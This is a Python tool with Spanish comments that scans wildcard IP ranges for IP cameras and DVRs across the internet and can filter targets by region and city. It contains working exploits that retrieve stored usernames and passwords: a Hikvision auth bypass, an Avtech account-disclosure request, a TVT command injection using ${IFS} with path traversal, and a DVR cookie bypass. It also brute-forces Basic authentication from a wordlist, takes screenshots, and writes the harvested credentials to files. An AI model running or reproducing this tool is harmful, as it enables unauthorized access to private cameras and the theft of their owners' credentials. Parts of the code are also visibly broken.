import fnmatch
import queue
import ipaddress
import threading
import subprocess
import socket
import time
import requests
import os
import base64
import sys
import json
import re  # Importamos la librería 're' para las expresiones regulares
from bs4 import BeautifulSoup
from urllib.parse import urlsplit
import random
from colorama import init, Fore, Style
from tqdm import tqdm
from requests.exceptions import RequestException, ConnectionError, Timeout  # tiempo errores
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent
import concurrent.futures
import argparse  # Importa el módulo argparse

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


# Definir el puerto a escanear (por ejemplo, 80)
ports = [80, 90, 100, 443, 8080, 81, 82, 83, 84, 88, 8010, 1813, 8181, 8000, 8001, 9000, 21, 23, 22, 25, 53, 161, 101, 137, 138, 139, 2002, 2082, 2083, 5000, 5001, 6001, 6002 ,6003, 5002, 37777, 5540, 5900, 3306, 3389, 2051, 8002, 8554, 8002, 8200, 8280, 88, 8002, 9000, 7000, 8500, 6200, 9200, 9876, 10000, 123, 143, 465, 587, 995, 993, 6660, 6661, 6662, 6663, 6664, 6665, 6666, 6667, 6668, 6669, 49152, 49153, 49154, 49155, 49156, 49157, 27017, 27018, 27019, 34567, 4567, 5432, 666, 667, 668, 669, 177, 186, 2200, 6881, 6882, 6883, 6884, 6885, 6886, 6887, 6888, 6889, 6890, 6891, 6892, 6893, 6894, 6895, 6896, 6897, 6898, 6899, 6880, 7001, 7002, 7003, 7004, 7005, 7006, 7007, 7008, 7009, 7010]

parser = argparse.ArgumentParser(description='Escaneo de puertos en direcciones IP')

parser.add_argument('--search', required=True, help='Patrón de direcciones IP a escanear con el * como comodín (ejemplo: 192.168.*.*) busqueda avanzada con google:https://www.exploit-db.com/google-hacking-database')
parser.add_argument('--port', nargs='+', type=int, help='Puerto o puertos a escanear. Presiona Enter para usar los puertos predeterminados.')
parser.add_argument('--region', help='Filtrar por región ej US,AR,MX')
parser.add_argument('--ciudad', help='Filtrar por ciudad')
parser.add_argument('--w', help='Ruta del archivo de texto con el wordlist (usuarios y contraseñas)')
parser.add_argument('--s', default=0.5, type=float, help='Tiempo de espera entre conexiones[SOCKET] (valor predeterminado: 0.5 segundos)')
parser.add_argument('--bn', default=2, type=float, help='Tiempo de espera [BANNER] (valor predeterminado: 2 segundos)')
parser.add_argument('--has_screenshot', choices=['all', 'cam'], help='Captura de pantalla [--has_screenshot all (todas las urls)] [--has_screenshot cam (todas las que se reconocen como camaras)]')
parser.add_argument('--reanudar', help='IP a partir de la cual se reanudará el escaneo EJ: --search 144.88.*.* --reanudar 144.88.92.63')

# Analizar los argumentos proporcionados al script
args = parser.parse_args()

# Actualizar los puertos si se proporciona un valor a través de --port, de lo contrario, usar los predeterminados
ports = args.port if args.port else ports

# Imprimir la variable 'ports'
print(f"Puertos seleccionados: {ports}")

# Acceder a los argumentos en el código
ip_pattern = args.search
FiltroRegion = args.region
FiltroCiudad = args.ciudad
reanudar_ip = args.reanudar

# Limpiar la pantalla (se asume que la función clear() está definida)
clear()

# Inicializar variables
processed_ips = 0
num_stars = ip_pattern.count('*')
threads = []
ip_queue = queue.Queue()
last_index = 0

# Verificar si se proporciona una IP para reanudar
if reanudar_ip:
    # Buscar la IP de reanudación en la cola
    while not ip_queue.empty():
        current_ip = ip_queue.get()
        last_index += 1
        ip_queue.put(current_ip)
        if current_ip == reanudar_ip:
            break

    # Iterar sobre posibles valores para las partes del patrón con comodines
    for i in range(last_index, 256**num_stars):
        parts = [i // (256**j) % 256 for j in range(num_stars)][::-1]
        ip = ip_pattern.replace('*', '{}').format(*parts)

        if last_index > 0:
            ip_queue.put(ip)
        elif ip == reanudar_ip:
            last_index += 1
            ip_queue.put(ip)
else:
    # Resto del código para la generación de IPs
    for i in range(256**num_stars):
        parts = [i // (256**j) % 256 for j in range(num_stars)][::-1]
        ip = ip_pattern.replace('*', '{}').format(*parts)
        ip_queue.put(ip)    

        
def is_camera(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((ip, port))
        
        banner = get_banner(ip, port)  # Obtener el banner
        sock.close()

        # Buscar la cadena "ETag:" en el banner
        if "ETag:" in banner:
            return True
        if 'WWW-Authenticate: Basic realm="index.html"' in banner:
            return True
        if "ID:" in banner:
            return True
        if "Camera:" in banner:
            return True
        if "camera:" in banner:
            return True
        if "Model:" in banner:
            return True
        if "HTTP/1.0 302 Found" in banner:
            return True
        if "WWW-Authenticate: Basic realm=\"index.html\"" in banner:
            return True
        if "WWW-Authenticate: Basic realm=\"streaming_server\"" in banner:
            return True
        if "Server: Hipcam RealServer/V1.0" in banner:
            return True
        if "Plugin:" in banner:
            return True
        if "Expires:" in banner:
            return True
        if "unknown" in banner:
            return True


        # Buscar palabras clave en el banner
        keywords = ["camera", "ActiveX", "Camera:", "Model:"]  # Agrega aquí las palabras clave que deseas buscar
        for keyword in keywords:
            if keyword in banner.lower():  # Convertir a minúsculas para una búsqueda insensible a mayúsculas y minúsculas
                return True

        return False
    except:
        return False

# Define your filter criteria (FiltroRegion and FiltroCiudad) here

exploit_checks = [
    "/System/deviceInfo?auth=YWRtaW46MTEK",
    "/onvif-http/snapshot?auth=YWRtaW46MTEK",
    "/ISAPI/Image/channels/1/ircutFilter"
]

def is_vulnerable(ip, port, exploit_checks):
    link = f"http://{ip}:{port}"
    try:
        for exploit_check in exploit_checks:
            x = requests.get(f'{link}{exploit_check}', timeout=3)
            if x.status_code == 200:
                return True
        return False
    except Exception:
        return False

class Colors:
    GREEN = '\033[92m'
    ORANGE = '\033[93m'
    DEFAULT = '\033[0m'
    RED = '\033[91m'
    YELLOW = '\033[93m'


def enviar_solicitud(ip, port, carga_cancelada, resultados):
    urls = [
        f'http://{ip}:{port}/video.mjpg',
        f'http://{ip}:{port}/cgi-bin/viewer/video.jpg',
        f'http://{ip}:{port}/onvif/Media',
        f'http://{ip}:{port}/System/configurationFile?auth=YWRtaW46MTEK',
        f'http://{ip}:{port}/pda.htm',
        f'http://{ip}:{port}/main.htm',
        f'http://{ip}:{port}/video.cgi?',
        f'http://{ip}:{port}/web/mobile.html',
        f'http://{ip}:{port}/asp/video.cgi'
        f'http://{ip}:{port}/serverpush.htm'
    ]

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(enviar_solicitud_individual, ip, port, url, carga_cancelada, resultados) for url in set(urls)]
        concurrent.futures.wait(futures)

usuarios = {}

# Cargar el wordlist desde el archivo de texto si se proporciona
if args.w:
    with open(args.w, 'r') as file:
        for line in file:
            key, value = line.strip().split(':')
            usuarios[key] = value


def manejar_respuesta(ip, port, url, response, usuario, contraseña, carga_cancelada, resultados):
    for chunk in response.iter_content(chunk_size=1024):
        if carga_cancelada.is_set():
            break

    if response.status_code == 200:
        resultados.append({'url': url, 'usuario': usuario, 'contraseña': contraseña})
        if len(resultados) <= 1:
            print(Colors.GREEN + f'[+] Posible-Vulnerabilidad en {url}' + Colors.DEFAULT)
            guardar_url(ip, port, url, "Usuario:NO", "Contraseña:NO")
        if len(resultados) <= 4:
            print(Colors.YELLOW + 'Falso Positivo' + Colors.DEFAULT)
        else:
            print(Colors.GREEN + f'[+] Posible-Vulnerabilidad en {url} con usuario {usuario} y contraseña {contraseña}.' + Colors.DEFAULT)
            guardar_url(ip, port, url, usuario, contraseña)

# Modifica la función enviar_solicitud_individual para pasar también la contraseña a manejar_respuesta
def enviar_solicitud_individual(ip, port, url, carga_cancelada, resultados):
    for usuario, contraseña in usuarios.items():
        try:
            credentials = base64.b64encode(f'{usuario}:{contraseña}'.encode('utf-8')).decode('utf-8')
            
            headers = {
                'Authorization': f'Basic {credentials}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Connection': 'close'
            }

            response = requests.get(url, headers=headers, stream=True, timeout=0.5)
            response.raise_for_status()

            if response.status_code == 200:
                manejar_respuesta(ip, port, url, response, usuario, contraseña, carga_cancelada, resultados)

                # Detener la exploración después de encontrar la primera vulnerabilidad
                if len(resultados) > 0:
                    return
            else:
                # Puedes agregar lógica aquí para manejar otros casos si es necesario
                pass

        except requests.exceptions.RequestException:
            resultados.append(None)
            
# Modifica la función guardar_url para incluir el usuario y la contraseña
def guardar_url(ip, port, url, usuario, contraseña):
    with open('Vulnerabilidades_Camaras.txt', 'a') as file:
        file.write(f'IP: {ip}, Port: {port}, URL: {url}, Usuario: {usuario}, Contraseña: {contraseña}\n')


def cancelar_carga(carga_cancelada):
    carga_cancelada.set()

def verificar_respuesta_200(ip, port, tiempo_cancelacion=0.1):
    carga_cancelada = threading.Event()
    resultados = []

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futuro_solicitud = executor.submit(enviar_solicitud, ip, port, carga_cancelada, resultados)

        try:
            resultado = futuro_solicitud.result(timeout=tiempo_cancelacion)
        except concurrent.futures.TimeoutError:
            carga_cancelada.set()
            resultado = False

    if resultado:
        print(Colors.RED + 'Direccionamiento-Unknown' + Colors.DEFAULT)

# Función para escanear credenciales del DVR
def scan_dvr_credentials(ip, port):
    fullHost_1 = f"http://{ip}:{port}/device.rsp?opt=user&cmd=list"

    def makeReqHeaders(xCookie):
        headers = {
            "Host": f"{ip}:{port}",
            "User-Agent": "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "es-AR,en-US;q=0.7,en;q=0.3",
            "Connection": "close",
            "Content-Type": "text/html",
            "Cookie": f"uid={xCookie}"
        }
        return headers

    try:
        rX = requests.get(fullHost_1, headers=makeReqHeaders(xCookie="admin"), timeout=10.0)
        rX.raise_for_status()  # Raise an exception for non-2xx HTTP status codes
    except Exception as e:
        print(Colors.RED + " [+] Tiempo de espera agotado: " + str(e) + Colors.DEFAULT)
        return "No se pudieron obtener credenciales: " + str(e)

    badJson = rX.text
    if not badJson:
        print(Colors.RED + " [+] No se encontraron credenciales o no es vulnerable" + Colors.DEFAULT)
        return "No se encontraron credenciales o No vulnerable"

    try:
        dataJson = json.loads(badJson)
        totUsr = len(dataJson["list"])
    except Exception as e:
        print(Colors.RED + " [+] Error al analizar JSON: " + str(e) + Colors.DEFAULT)
        return "Error al analizar JSON: " + str(e)
    
    print(Colors.GREEN + "\n [+] DVR (url):\t\t" + Colors.ORANGE + f"http://{ip}:{port}/" + Colors.GREEN)
    print(" [+] Port: \t\t" + Colors.ORANGE + str(port) + Colors.DEFAULT)
    print(Colors.GREEN + "\n [+] Users List:\t" + Colors.ORANGE + str(totUsr) + Colors.DEFAULT)
    print(" ")

    credentials_list = []

    if totUsr > 0:
        print(Colors.GREEN + " [+] Credenciales Encontradas:" + Colors.DEFAULT)
        for obj in range(0, totUsr):
            _usuario = dataJson["list"][obj]["uid"]
            _password = dataJson["list"][obj]["pwd"]
            _role = dataJson["list"][obj]["role"]
            print(f" - User: {_usuario}, Password: {_password}, Role: {_role}")
            credentials_list.append(f"Usuario: {_usuario}, Contraseña: {_password}, Rol: {_role}")
        return credentials_list
    else:
        print(Colors.RED + " [+] No se encontraron credenciales." + Colors.DEFAULT)
        return "No se encontraron credenciales."

def is_valid_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        return False


def extract_domain(ip):
    try:
        domain = socket.gethostbyaddr(ip)[0]
        return domain
    except socket.herror:
        return "N/A"

def get_response_body(ip, port, endpoint):
    domain = extract_domain(ip)
    url = f"http://{domain}:{port}{endpoint}"
    
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            response_body = response.text
            #print(f"Response Body: {response_body}")  # Print the response body
            return response_body
        else:
            return "N/A"
    except requests.exceptions.RequestException:
        return "N/A"

def check_vuln_hikvision(ip, port):
    url = f"http://{ip}:{port}/"

    try:
        data = requests.get(url)
        if data.status_code != 200:
            print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {data.status_code})" + Colors.DEFAULT)
            return None

        data = requests.get(url + "/doc/page/login.asp")
        if data.status_code == 404:
            print(Colors.RED + f"[{ip}:{port}] - no se parece a Hikvision" + Colors.DEFAULT)
            return None

        data = requests.get(url + "c")
        if data.status_code != 200:
            if data.status_code == 500:
                print(Colors.RED + f"[{ip}:{port}] - no se pudo verificar si era vulnerable (Code: {data.status_code})" + Colors.DEFAULT)
                return None
            else:
                print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {data.status_code})" + Colors.DEFAULT)
                return None

        print(Colors.GREEN + f"[{ip}:{port}] - Posible-Vulnerabilidad-Hikvision" + Colors.DEFAULT)
        # You can perform any additional actions here if the host is vulnerable.
        return True
    except requests.exceptions.RequestException as e:
        print(f"[{ip}:{port}] - request error: {e}")
        return None


def check_vuln_avtech(ip, port, etype=1):
    url = f"http://{ip}:{port}/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*"

    if etype == 2:
        url = f"http://{ip}:{port}/cgi-bin/user/Config.cgi?.cab&action=get&category=Account."

    try:
        response = requests.get(url, headers={
            "User-Agent": random.choice(user_agents)
        }, timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"[{ip}:{port}] - connection error")
        return None
    except requests.exceptions.ReadTimeout:
        print(f"[{ip}:{port}] - timeout error")
        return None

    if "Account.Maxuser" in response.text:
        try:
            user_username = response.text.split("User1.Username=")[1].split("\n")[0]
            user_password = response.text.split("User1.Password=")[1].split("\n")[0]
        except IndexError:
            print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {response.status_code})" + Colors.DEFAULT)
            return None

        print(Colors.GREEN + f"[{ip}:{port}] - Posible-Vulnerabilidad-Hikvision" + Colors.DEFAULT)
        # You can perform any additional actions here if the host is vulnerable.
        return True

    else:
        print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {response.status_code})" + Colors.DEFAULT)
        if etype == 1:
            check_vuln_avtech(ip, port, 2)
        return None

def raw_url_request(url):
    try:
        response = requests.get(url, timeout=5)
        return response
    except requests.exceptions.ConnectionError:
        return None
    except requests.exceptions.Timeout:
        return None

def check_vuln_tvt(ip, port):
    IFS = ' '
    try:
        raw_url_request(f"http://{ip}:{port}/language/Swedish${IFS}&&echo${IFS}1>test&&tar${IFS}/string.js")
        response = raw_url_request(f"http://{ip}:{port}/../../../../../../../mnt/mtd/test")
        raw_url_request(f"http://{ip}:{port}/language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js")
    except (ConnectionError, Timeout) as e:
        print(Colors.RED + f"[{ip}:{port}] - Conexion/Agotada error" + Colors.DEFAULT)
        return False
    if response.text[0] != '1':
        print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {response.status_code})" + Colors.DEFAULT)
        return False

    print(Colors.GREEN + f"[{ip}:{port}] - Posible Exploit" + Colors.DEFAULT)
    return True

def capture_screenshot(ip, port):
    try:
        url = f"http://{ip}:{port}"
        response = requests.get(url, timeout=5)

        if not response.ok:
            return

        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-notifications')
        chrome_options.add_argument('--log-level=3')
        chrome_options.add_argument('--disable-dev-shm-usage')

        driver = webdriver.Chrome(options=chrome_options)
        driver.get(url)

        # Esperar a que la página se cargue completamente
        driver.implicitly_wait(10)

        screenshot_filename = f"screenshot/{ip}-{port}.png"
        driver.save_screenshot(screenshot_filename)

    except requests.RequestException as e:
        pass

    except Exception as e:
        pass

    finally:
        if 'driver' in locals() and driver is not None:
            driver.quit()

def GuardarDatos(data):
    tamanio_actual = 0

    if os.path.isfile("datos.json"):
        tamanio_actual = os.path.getsize("datos.json")
        try:
            with open("datos.json", "r") as file:
                existing_data = json.load(file)
        except Exception as e:
            # Intenta cargar desde el respaldo en caso de error al leer datos.json
            try:
                with open("respaldo.json", "r") as backup_file:
                    existing_data = json.load(backup_file)
            except Exception as backup_exception:
                existing_data = []
    else:
        # Intenta cargar desde el respaldo si no hay datos.json
        try:
            with open("respaldo.json", "r") as backup_file:
                existing_data = json.load(backup_file)
        except Exception as backup_exception:
            existing_data = []

    existing_data.append(data)
    json_data = json.dumps(existing_data, indent=4)

    try:
        with open("datos.json", "w") as file:
            file.write(json_data)
    except Exception as e:
        # Si hay un error al escribir en datos.json, no se realiza el respaldo
        pass

    # Lógica para hacer respaldo solo si datos.json no está corrupto y su tamaño es mayor que 0
    try:
        if tamanio_actual > 0:
            with open("datos.json", "r") as check_file:
                json.load(check_file)

            tiempo_actual = time.time()
            tiempo_ultima_copia = os.path.getmtime("respaldo.json") if os.path.exists("respaldo.json") else 0

            if (tiempo_actual - tiempo_ultima_copia) > 5:
                with open("respaldo.json", "w") as file:
                    file.write(json.dumps(existing_data, indent=4))
    except Exception as e:
        # Si hay algún error al cargar datos.json, no se realiza el respaldo
        pass

def scan(ip, ports):
    PURPLE = "\033[35m"

    if not is_valid_ip(ip):
        ip_list = search_and_display_titles(ip)
        if ip_list is not None:
            for ip in ip_list:
                # Realiza operaciones con la lista de direcciones IP
                pass
        else:
            print("No se encontraron direcciones IP válidas.")

    # Configura el número máximo de hilos/conexiones paralelas
    max_threads = 10

    try:
        with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
            futures = []
            for port in ports:
                #futures.append(executor.submit(capture_screenshot, ip, port))
                futures.append(executor.submit(ip, port))

            # Espera a que todas las tareas se completen
            concurrent.futures.wait(futures)
            
    except concurrent.futures.CancelledError:
        pass
    except Exception as e:
        pass


    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(args.s)
                result = sock.connect_ex((ip, port))
                if result != 0:
                    #futures.append(executor.submit(capture_screenshot, ip, ports[0]))
                    futures.append(executor.submit(ip, ports[0]))
                    continue

                try:
                    service_name = socket.getservbyport(port)
                except OSError:
                    service_name = "unknown"

                banner = get_banner(ip, port)
                region, city, country = get_location(ip)

                # Extract the domain name from the IP
                domain = extract_domain(ip)

                # Get the response body from the service
                response_body = get_response_body(ip, port, '/some_endpoint_here')  # Change '/some_endpoint_here' to the actual endpoint
                hikvision_vulnerable = False # valor predeterminado
                avtech_vulnerable = False # valor predeterminado
                tvt_vulnerable = False # valor predeterminado
                cam = False # valor predeterminado


                # Check if the region and city match the filters
                if (FiltroRegion and region == FiltroRegion) or (FiltroCiudad and city == FiltroCiudad) or (FiltroCiudad is None and FiltroRegion is None):
                    formatted_ip = f"{Fore.YELLOW}{ip}{Style.RESET_ALL}:{Fore.YELLOW}{port}{Style.RESET_ALL}"
                    formatted_service_name = f"{Fore.YELLOW}{service_name}{Style.RESET_ALL}"
                    formatted_banner = f"{Fore.CYAN}{banner}{Style.RESET_ALL}"
                    formatted_region = f"{Fore.YELLOW}{region}{Style.RESET_ALL}"
                    formatted_city = f"{Fore.YELLOW}{city}{Style.RESET_ALL}"
                    formatted_domain = f"{Fore.YELLOW}{domain}{Style.RESET_ALL}"

                    print(f"IP: {formatted_ip}\nServicio: {formatted_service_name}\nBanner: {formatted_banner}\nRegión: {formatted_region}\nCiudad: {formatted_city}\nDominio: {formatted_domain}")

                    credentials_found = "NULL"
                    if args.has_screenshot == 'all':
                        capture_screenshot(ip, port)
                    
                    if is_camera(ip, port) and not "HTTP/1.0 302 Found" in banner and not "unknown" in banner:
                        if args.has_screenshot == 'cam':
                            capture_screenshot(ip, port)
                        if "HTTP/1.0 401 Unauthorized Access Denied" in banner or "HTTP/1.1 401 Unauthorized" in banner:
                            cam = verificar_respuesta_200(ip,port,tiempo_cancelacion=1)
                        print(f"{Fore.GREEN}[+]Camara-Encontrada{Style.RESET_ALL}")
                        hikvision_vulnerable = check_vuln_hikvision(ip, port)
                        if hikvision_vulnerable:
                            avtech_vulnerable = check_vuln_avtech(ip, port)
                            tvt_vulnerable = check_vuln_tvt(ip, port)
                    else:
                        print(f"{Fore.RED}[-]Cámara-No-Encontrada{Style.RESET_ALL}")
                        
                    if "HTTP/1.0 302 Found" in banner:
                        if args.has_screenshot == 'cam':
                            capture_screenshot(ip, port)
                        credentials_found = scan_dvr_credentials(ip, port)                           

                    print("-" * 50)

                    data = {
                        "IP": ip,
                        "Puerto": port,
                        "Servicio": service_name,
                        "Banner": banner,
                        "Región": region,
                        "Ciudad": city,
                        "Dominio": domain,  # Include the domain
                        "CuerpoRespuesta": response_body,  # Include the response body
                        "ExploitVulnerable": {
                            "Hikvision": hikvision_vulnerable,
                            "Avtech": avtech_vulnerable,
                            "TVT": tvt_vulnerable,
                            "video.mjpg-Vulnerable": cam
                        },
                        "CredencialesDVR": credentials_found,  # Agrega los datos del escaneo de credenciales del DVR
                        "Separador": "-" * 50
                    }

                    GuardarDatos(data)

                else:
                    print(f"Filtrando: {ip}:{port} Región: {region} Ciudad: {city}\n")

        except socket.gaierror as e:
            continue
        except Exception as e:
            continue
        finally:
            # Guarda la última IP en un archivo
            with open("Ultima_IP.txt", "w") as last_ip_file:
                last_ip_file.write(ip)
            sock.close()
            
# Crea una instancia de UserAgent
ua = UserAgent()
# List of User-Agent strings
user_agents = [ua.random for _ in range(10000)]
#user_agents = [
#    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
#    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/54.0",
#    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
#    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
#    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
#    "Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
    # Add more User-Agent strings as needed
#]

# Lista de motores de búsqueda que deseas utilizar
search_engines = [
    {
        "name": "Google",
        "url": "https://www.google.com/search",
        "color": "\033[92m"  # Código de color ANSI para verde
    },
    {
        "name": "Bing",
        "url": "https://www.bing.com/search",
        "color": "\033[91m"  # Código de color ANSI para rojo
    },
    #{
    #    "name": "DuckDuckGo",
    #    "url": "https://duckduckgo.com/html/",
    #    "color": "\033[94m"  # Código de color ANSI para azul
    #}
]

max_attempts = 3  # Número máximo de intentos por motor de búsqueda
timeout = 5  # Tiempo máximo de espera antes de cambiar de motor (en segundos)
max_failures = 1

def is_engine_working(engine):
    try:
        response = requests.get(engine["url"], timeout=timeout)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def filter_unique_ips(ip_list):
    if ip_list is None:
        return []  # Devuelve una lista vacía si la entrada es None

    # Utilizamos un conjunto para asegurar direcciones IP únicas
    unique_ips = set()
    filtered_ips = []

    for ip in ip_list:
        if ip not in unique_ips:
            unique_ips.add(ip)
            filtered_ips.append(ip)

    return filtered_ips


def extract_disallowed_urls(robots_content):
    disallowed_urls = set()  # Use a set to store unique URLs
    # Use regular expressions to extract URLs disallowed by the robots.txt file
    disallowed_matches = re.finditer(r'Disallow:\s*(.+)', robots_content, re.IGNORECASE)
    for match in disallowed_matches:
        disallowed_path = match.group(1).strip()
        if disallowed_path:
            disallowed_urls.add(disallowed_path)  # Add to the set to ensure uniqueness
    return disallowed_urls

def search_and_display_titles(query, max_pages=10):
    # ANSI escape codes for text colors
    PURPLE = "\033[35m"
    WHITE = "\033[97m"
    ORANGE = "\033[33m"  # ANSI escape code for orange text
    RESET = "\033[0m"   # ANSI escape code to reset text color
    ip_url_mapping = {}  # Utilizamos un diccionario para mapear direcciones IP a URLs

    with requests.Session() as session:
        for engine in search_engines:
            if not is_engine_working(engine):
                print(f"{PURPLE}Motor: {engine['name']} no está funcionando o está bloqueado. Cambiando de motor...\033[0m")
                continue

            for page in range(1, max_pages + 1):
                search_url = engine["url"]
                params = {
                    "q": query,
                    "start": (page - 1) * 10
                }

                headers = {
                    "User-Agent": random.choice(user_agents)
                }

                try:
                    response = session.get(search_url, params=params, headers=headers, timeout=timeout)
                    response.raise_for_status()
                    soup = BeautifulSoup(response.text, 'html.parser')

                    search_results = soup.find_all('a', href=True)

                    for result in search_results:
                        url = result['href']
                        if url.startswith("http"):
                            domain = urlsplit(url).netloc
                            try:
                                ip_address = socket.gethostbyname(domain)
                                if ip_address != '0.0.0.0':
                                    if ip_address not in ip_url_mapping:
                                        ip_url_mapping[ip_address] = set()  # Use a set to store unique URLs
                                        print(f"{WHITE}URL: {url}{RESET}")
                                    ip_url_mapping[ip_address].add(url)  # Mapear URL a IP

                            except socket.gaierror:
                                continue
                            
                    time.sleep(1)

                except requests.exceptions.RequestException as e:
                    continue

    # Utiliza la función de filtro para obtener direcciones IP únicas
    unique_ips = filter_unique_ips(list(ip_url_mapping.keys()))
    #input("Presiona Enter para continuar...")

    for ip in unique_ips:
        print(f"{PURPLE}IP Address: {ip}\033[0m")
        urls_for_ip = ip_url_mapping[ip]
        for url in urls_for_ip:
            print(f"{WHITE}URL: {url}{RESET}")

            # Check for robots.txt and display disallowed URLs
            robots_url = f"{url.rstrip('/')}/robots.txt"
            try:
                robots_response = session.get(robots_url, timeout=timeout)
                if robots_response.status_code == 200:
                    robots_content = robots_response.text
                    disallowed_urls = extract_disallowed_urls(robots_content)
                    if disallowed_urls:
                        print(f"{ORANGE}Disallowed URLs for {url}:{RESET}")
                        for disallowed_url in disallowed_urls:
                            print(f"{url}/{ORANGE}{disallowed_url}{RESET}")

            except requests.exceptions.RequestException as e:
                continue

        # Check if ports_to_scan is specified and scan the IP
        if ports:
            scan(ip, ports)

def main():
    list_of_links = []  # Populate this list with IP addresses
    ports_to_scan = ports  # Define the ports you want to scan

    for link in list_of_links:
        scan(link, ports_to_scan)

if __name__ == "__main__":
    main()

def format_unknown(value):
    return f"{Fore.RED}{value}{Style.RESET_ALL}"

def get_banner(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(args.bn)
        sock.connect((ip, port))
        sock.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner if banner != "unknown" else format_unknown(banner)
    except:
        return format_unknown("unknown")

def get_http_banner(ip):
    try:
        response = requests.head(f"http://{ip}")
        banner = response.headers.get("Server", "unknown")
        return banner if banner != "unknown" else format_unknown(banner)
    except:
        return format_unknown("unknown")

def get_location(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        region = data["country"]
        city = data["city"]
        country = data["countryCode"]
        return (
            region if region != "unknown" else format_unknown(region),
            city if city != "unknown" else format_unknown(city),
            country if country != "unknown" else format_unknown(country)
        )
    except:
        return format_unknown("unknown"), format_unknown("unknown"), format_unknown("unknown")

# Crear una barra de progreso con el número total de direcciones IP a escanear
bar = tqdm(total=ip_queue.qsize(), desc="Escaneando direcciones IP")
clear()
print(f"buscando {ip_pattern}")

# Crear una lista para almacenar las direcciones IP escaneadas
ip_pattern_list = []

# Crear un bucle infinito que se repita mientras haya direcciones IP en la cola
while not ip_queue.empty():
    # Verificar si hay direcciones IP en la cola
    # Sacar una dirección IP de la cola
    ip = ip_queue.get()
    ip_pattern_list.append(ip)  # Agregar la dirección IP a la lista
    
    # Incrementar el contador de direcciones IP procesadas
    processed_ips += 1
    
    # Actualizar la barra de progreso
    bar.update(1)  # Esto actualiza la barra de progreso

    # Crear un hilo de ejecución que ejecute la función scan con la dirección IP y el puerto dados
    t = threading.Thread(target=scan, args=(ip, ports))
    # Añadir el hilo a la lista de hilos
    threads.append(t)
    # Iniciar el hilo
    t.start()
    # Si no hay direcciones IP en la cola, esperar 1 segundo antes de verificar nuevamente
    time.sleep(1)

# Esperar a que todos los hilos terminen
for t in threads:
    t.join()

# Cerrar la barra de progreso
bar.close()
